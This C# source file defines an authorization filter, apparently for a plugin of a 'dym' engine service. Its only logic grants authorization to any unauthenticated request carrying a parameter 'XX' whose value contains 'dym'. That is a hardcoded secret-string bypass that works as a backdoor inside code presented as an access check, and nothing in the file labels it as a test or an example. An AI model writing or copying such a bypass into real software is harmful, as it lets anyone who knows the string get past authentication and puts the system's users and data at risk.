using System;
using System.Collections.Generic;
using System.Text;
using dym.EngineData;
using dym.EngineData.Filters;

namespace dym.Plugs.SamsundotService.Filter
{
   public class AuthFilter:AuthorizationFilterAttribute
    {
        public override void OnAuthorization(BaseModule context)
        {
            if (!context.Authorized&&context.RequestContainsKey("XX")&&context.RequestString("XX").Contains("dym"))
            {
                context.Authorized = true;
            }
        }
    }
}
